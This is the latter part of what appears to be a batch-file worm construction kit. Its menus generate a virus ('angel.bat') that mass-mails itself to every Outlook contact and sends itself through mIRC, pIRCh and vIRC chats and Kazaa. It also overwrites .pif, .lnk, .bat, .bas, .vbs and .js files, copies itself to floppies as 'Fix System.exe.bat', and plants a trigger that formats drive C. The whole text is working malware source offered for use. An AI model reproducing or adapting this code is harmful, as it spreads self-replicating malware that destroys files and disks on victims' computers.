@echo"@echo.for y = 1 To c.AddressLists.Count>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.set d=c.AddressLists(y)>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.x = 1>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.set e=b.CreateItem(0)>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.for o = 1 To d.AddressEntries.Count>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.f = d.AddressEntries(x)>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.Recipients.Add f>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.x = x + 1>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.next>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.Subject = " The angels will flood the world !!! ">>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.Body = " The angelz underground ">>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.Attachments.Add ("c:\windows\system\angel\angel.bat")>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.DeleteAfterSubmit = False>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.e.Send>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.f = "">>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo"@echo.next>>c:\windows\system\angel\oe.vbs">>ioana.txt
@echo.@start c:\windows\system\angel\oe.vbs>>ioana.txt
ctty con
cls
goto 006

:a15
cls
ctty nul
@echo.:: no Outlook Express spreading>>ioana.txt
ctty con
cls
goto 006

:006
cls
echo.
echo.
echo.
echo        mirc worm
echo.
echo.
echo.
echo    1 - mIRC spreading
echo.
echo    2 - No mIRC spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a17
if errorlevel 1 goto a16
echo CHOICE missing
goto done

:a16
cls
ctty nul
@echo"@echo.[script]>c:\windows\system\angel\script.ini">>ioana.txt
@echo"@echo.n0=on 1:JOIN:#:{>>c:\windows\system\angel\script.ini">>ioana.txt
@echo"@echo.n1=/if ( $nick == $me ) { halt }>>c:\windows\system\angel\script.ini">>ioana.txt
@echo"@echo.n2=/dcc send $nick c:\windows\system\angel\angel.bat>>c:\windows\system\angel\script.ini">>ioana.txt
@echo"@echo.n3=}>>c:\windows\system\angel\script.ini">>ioana.txt
@echo.@if exist c:\mirc\script.ini deltree/y c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\script.ini deltree/y c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\script.ini deltree/y c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\script.ini deltree/y c:\progra~1\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\mirc\mirc.ini copy c:\windows\system\angel\script.ini c:\mirc\script.ini>>ioana.txt
@echo.@if exist c:\mirc32\mirc.ini copy c:\windows\system\angel\script.ini c:\mirc32\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc\mirc.ini copy c:\windows\system\angel\script.ini c:\progra~1\mirc\script.ini>>ioana.txt
@echo.@if exist c:\progra~1\mirc32\mirc.ini copy c:\windows\system\angel\script.ini c:\progra~1\mirc32\script.ini>>ioana.txt
ctty con
cls
goto 007

:a17
cls
ctty nul
@echo.:: no mIRC spreading>>ioana.txt
ctty con
cls
goto 007

:007
cls
echo.
echo.
echo.
echo        pirch worm
echo.
echo.
echo.
echo    1 - pIRCh spreading
echo.
echo    2 - No pIRCh spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a19
if errorlevel 1 goto a18
echo CHOICE missing
goto done

:a18
cls
ctty nul
@echo"@echo.[Levels]>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Enabled=1>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Count=1>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Level1=dm>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.dmEnabled=1>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.[dm]>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.User1=*!*@*>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.UserCount=1>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Event1=ON PART:#:/dcc send $nick c:\windows\system\angel\angel.bat | /msg $nick The ANGELZ will flood the world !!!>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Event2=ON JOIN:#:/dcc send $nick c:\windows\system\angel\angel.bat | /notice $nick The ANGELZ will flood the world !!!>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Event3=ON TEXT:*fuck*:*:/write -I c:\autoexec.bat FORMAT C:/Q/U/AUTOTEST /8>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Event4=ON TEXT:*sex*:*:/dcc send $nick c:\windows\system\angel\angel.bat>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.Event5=ON TEXT:*girl*:*:/dcc send $nick c:\windows\system\angel\angel.bat>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@echo.EventCount=5>>c:\windows\system\angel\events.ini">>ioana.txt
@echo"@deltree/y c:\pirch\events.ini >nul">>ioana.txt
@echo.@copy c:\windows\system\angel\events.ini c:\pirch\events.ini>>ioana.txt
@echo"@deltree/y c:\pirch98\events.ini >nul">>ioana.txt
@echo.@copy c:\windows\system\angel\events.ini c:\pirch98\events.ini>>ioana.txt
ctty con
cls
goto 008

:a19
cls
ctty nul
@echo.:: no pIRCh spreading>>ioana.txt
ctty con
cls
goto 008

:008
cls
echo.
echo.
echo.
echo        virc worm
echo.
echo.
echo.
echo    1 - vIRC spreading
echo.
echo    2 - No vIRC spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a21
if errorlevel 1 goto a20
echo CHOICE missing
goto done

:a20
cls
ctty nul
@echo"@echo.set ws = CreateObject("wscript.shell")>>c:\windows\system\angel\virc.vbs">>ioana.txt
@echo"@echo.ws.regwrite "HKEY_USERS\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17","dcc send $nick c:\windows\system\angel\angel.bat">>c:\windows\system\angel\virc.vbs">>ioana.txt
@echo.@start c:\windows\system\angel\virc.vbs>>ioana.txt
ctty con
cls
goto 009

:a21
cls
ctty nul
@echo.:: no vIRC spreading>>ioana.txt
ctty con
cls
goto 009

:009
cls
echo.
echo.
echo.
echo        Kazaa worm
echo.
echo.
echo.
echo    1 - Kazaa spreading
echo.
echo    2 - No Kazaa spreading
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a23
if errorlevel 1 goto a22
echo CHOICE missing
goto done

:a22
cls
ctty nul
@echo"@echo.set ws=CreateObject("wscript.shell")>>c:\windows\system\angel\kaz.vbs">>ioana.txt
@echo"@echo.ws.regwrite "HKLM\Software\KaZaA\Transfer\DlDir0","c:\windows\system\angel\">>c:\windows\system\angel\kaz.vbs">>ioana.txt
@echo.@start c:\windows\system\angel\kaz.vbs>>ioana.txt
ctty con
cls
goto 010

:a23
cls
ctty nul
@echo.:: no Kazaa spreading>>ioana.txt
ctty con
cls
goto 010

:010
cls
echo.
echo.
echo.
echo        Drop over .pif files
echo.
echo.
echo.
echo    1 - PIF dropping
echo.
echo    2 - No PIF dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a25
if errorlevel 1 goto a24
echo CHOICE missing
goto done

:a24
cls
ctty nul
@echo"@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>c:\windows\system\angel\pif.vbs">>ioana.txt
@echo"@echo.set msc=wshs.CreateShortcut("C:\pif.lnk")>>c:\windows\system\angel\pif.vbs">>ioana.txt
@echo"@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\angel\angel.bat")>>c:\windows\system\angel\pif.vbs">>ioana.txt
@echo"@echo.msc.WindowStyle = 4>>c:\windows\system\angel\pif.vbs">>ioana.txt
@echo"@echo.msc.Save>>c:\windows\system\angel\pif.vbs">>ioana.txt
@echo.@start c:\windows\system\angel\pif.vbs>>ioana.txt
@echo"@type nul | choice /n /cy /ty,7 >nul">>ioana.txt
@echo.@for %%%%a in (c:\*.pif *.pif ..\*.pif c:\mydocu~1\*.pif %%windir%%\*.pif %%path%%\*.pif %%windir%%\desktop\*.pif %%windir%%\system\*.pif) do copy c:\pif.pif %%%%a>>ioana.txt
ctty con
cls
goto 011

:a25
cls
ctty nul
@echo.:: no PIF dropping>>ioana.txt
ctty con
cls
goto 011

:011
cls
echo.
echo.
echo.
echo        Drop over .lnk files
echo.
echo.
echo.
echo    1 - LNK dropping
echo.
echo    2 - No LNK dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a27
if errorlevel 1 goto a26
echo CHOICE missing
goto done

:a26
cls
ctty nul
@echo"@echo.set wshs=Wscript.CreateObject("WScript.Shell")>>c:\windows\system\angel\lnk.vbs">>ioana.txt
@echo"@echo.set msc=wshs.CreateShortcut("C:\lnk.lnk")>>c:\windows\system\angel\lnk.vbs">>ioana.txt
@echo"@echo.msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\angel\angel.bat")>>c:\windows\system\angel\lnk.vbs">>ioana.txt
@echo"@echo.msc.WindowStyle = 4>>c:\windows\system\angel\lnk.vbs">>ioana.txt
@echo"@echo.msc.Save>>c:\windows\system\angel\lnk.vbs">>ioana.txt
@echo.@start c:\windows\system\angel\lnk.vbs>>ioana.txt
@echo"@type nul | choice /n /cy /ty,7 >nul">>ioana.txt
@echo.@for %%%%b in (c:\*.lnk *.lnk ..\*.lnk c:\mydocu~1\*.lnk %%windir%%\*.lnk %%path%%\*.lnk %%windir%%\desktop\*.lnk %%windir%%\system\*.lnk) do copy c:\lnk.lnk %%%%b>>ioana.txt
ctty con
cls
goto 012

:a27
cls
ctty nul
@echo.:: no LNK dropping>>ioana.txt
ctty con
cls
goto 012

:012
cls
echo.
echo.
echo.
echo        Drop over .bat files
echo.
echo.
echo.
echo    1 - BAT dropping
echo.
echo    2 - No BAT dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a29
if errorlevel 1 goto a28
echo CHOICE missing
goto done

:a28
cls
ctty nul
@echo.@for %%%%c in (c:\*.bat *.bat ..\*.bat c:\mydocu~1\*.bat %%windir%%\*.bat %%path%%\*.bat %%windir%%\desktop\*.bat %%windir%%\system\*.bat) do copy c:\windows\system\angel\angel.bat %%%%c>>ioana.txt
ctty con
cls
goto 013

:a29
cls
ctty nul
@echo.:: no BAT dropping>>ioana.txt
ctty con
cls
goto 013

:013
cls
echo.
echo.
echo.
echo        Drop over (QBasic) .bas files
echo.
echo.
echo.
echo    1 - (QBasic) BAS dropping
echo.
echo    2 - No (QBasic) BAS dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a31
if errorlevel 1 goto a30
echo CHOICE missing
goto done

:a30
cls
ctty nul
@echo"@echo.100 CLS>c:\windows\system\angel\angel.bas">>ioana.txt
@echo"@echo.101 SHELL "ctty nul">>c:\windows\system\angel\angel.bas">>ioana.txt
@echo"@echo.102 SHELL "@echo off">>c:\windows\system\angel\angel.bas">>ioana.txt
@echo"@echo.103 SHELL "c:\windows\system\angel\angel.bat">>c:\windows\system\angel\angel.bas">>ioana.txt
@echo"@echo.104 END>>c:\windows\system\angel\angel.bas">>ioana.txt
@echo"@for %%%%d in (c:\*.bas *.bas ..\*.bas c:\mydocu~1\*.bas %%windir%%\*.bas %%path%%\*.bas %%windir%%\desktop\*.bas %%windir%%\system\*.bas) do copy c:\windows\system\angel\angel.bas %%%%d>>ioana.txt
ctty con
cls
goto 014

:a31
cls
ctty nul
@echo.:: no (QBasic) BAS dropping>>ioana.txt
ctty con
cls
goto 014

:014
cls
echo.
echo.
echo.
echo        Drop over .vbscript files
echo.
echo.
echo.
echo    1 - VBScript dropping
echo.
echo    2 - No VBScript dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a33
if errorlevel 1 goto a32
echo CHOICE missing
goto done

:a32
cls
ctty nul
@echo"@echo.set wshs=wscript.createobject("wscript.shell")>>c:\windows\system\angel\vbs.vbs">>ioana.txt
@echo"@echo.wshs.run "c:\windows\system\angel\angel.bat", VBHide>>c:\windows\system\angel\vbs.vbs">>ioana.txt
@echo"@for %%%%e in (c:\*.vb* *.vb* ..\*.vb* c:\mydocu~1\*.vb* %%windir%%\*.vb* %%path%%\*.vb* %%windir%%\desktop\*.vb* %%windir%%\system\*.vb*) do copy c:\windows\system\angel\vbs.vbs %%%%e>>c:\windows\system\angel\vbs.vbs">>ioana.txt
ctty con
cls
goto 015

:a33
cls
ctty nul
@echo.:: no VBScript dropping>>ioana.txt
ctty con
cls
goto 015

:015
cls
echo.
echo.
echo.
echo        Drop over .js files
echo.
echo.
echo.
echo    1 - JS dropping
echo.
echo    2 - No JS dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a35
if errorlevel 1 goto a34
echo CHOICE missing
goto done

:a34
cls
ctty nul
@echo"@echo.shell=WScript.CreateObject("WScript.Shell");>>c:\windows\system\angel\js.js">>ioana.txt
@echo"@echo.shell.Run("c:\windows\system\angel\angel.bat");>>c:\windows\system\angel\js.js">>ioana.txt
@echo"@for %%%%f in (c:\*.js *.js ..\*.js c:\mydocu~1\*.js %%windir%%\*.js %%path%%\*.js %%windir%%\desktop\*.js %%windir%%\system\*.js) do copy c:\windows\system\angel\js.js %%%%f>>c:\windows\system\angel\js.js">>ioana.txt
@echo"@for %%%%g in (c:\*.jse *.jse ..\*.jse c:\mydocu~1\*.jse %%windir%%\*.jse %%path%%\*.jse %%windir%%\desktop\*.jse %%windir%%\system\*.jse) do copy c:\windows\system\angel\js.js %%%%g>>c:\windows\system\angel\js.js">>ioana.txt
ctty con
cls
goto 016

:a35
cls
ctty nul
@echo.:: no JS dropping>>ioana.txt
ctty con
cls
goto 016

:016
cls
echo.
echo.
echo.
echo        Drop over FLOPPY disks [if they exist]
echo.
echo.
echo.
echo    1 - FLOPPY dropping [a drive only]
echo.
echo    2 - No FLOOPY dropping
echo.
echo    Q - e X i t
echo.
choice /c:12Q>nul
if errorlevel 3 goto done
if errorlevel 2 goto a37
if errorlevel 1 goto a36
echo CHOICE missing
goto done

:a36
cls
ctty nul
@echo"@echo.if exist a:\nul goto ok>chkdsk.bat">>ioana.txt
@echo"@echo.goto nok>>chkdsk.bat">>ioana.txt
@echo"@echo.:nok>>chkdsk.bat">>ioana.txt
@echo"@echo.@if exist ~exist.txt deltree/y ~exist.txt>>chkdsk.bat">>ioana.txt
@echo"@echo.goto done>>chkdsk.bat">>ioana.txt
@echo"@echo.:ok>>chkdsk.bat">>ioana.txt
@echo"@echo.rem>~exist.txt>>chkdsk.bat">>ioana.txt
@echo"@echo.goto done>>chkdsk.bat">>ioana.txt
@echo"@echo.:done>>chkdsk.bat">>ioana.txt
@echo"command /f /c chkdsk.bat">>ioana.txt
@echo"@deltree/y chkdsk.bat >nul">>ioana.txt
@echo"@if not exist ~exist.txt goto nodisk">>ioana.txt
@echo"@deltree/y ~exist.txt >nul">>ioana.txt
@echo.goto do>>ioana.txt
@echo.:do>>ioana.txt
@echo"@echo.@copy c:\windows\system\angel\angel.bat a:\"Fix System.exe.bat">>ioana.txt
@echo.goto done>>ioana.txt
@echo.:nodisk>>ioana.txt
@echo.goto done>>ioana.txt
ctty con
cls
goto 017

:a37
cls
ctty nul
@echo.:: no FLOPPY dropping>>ioana.txt
ctty con
cls
goto 017

:017
cls
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo.
@echo        Your creation is now compiled in curent folder [ioana.txt]
@echo                     Rename ioana.txt to filename.bat              
@echo.
@echo                        Press any key to exit ...
@pause >nul
goto done

:XP
exit

:done
@echo.:XP>>ioana.txt
@echo.exit>>ioana.txt
@echo.:done>>ioana.txt
@echo.cls>>ioana.txt
cls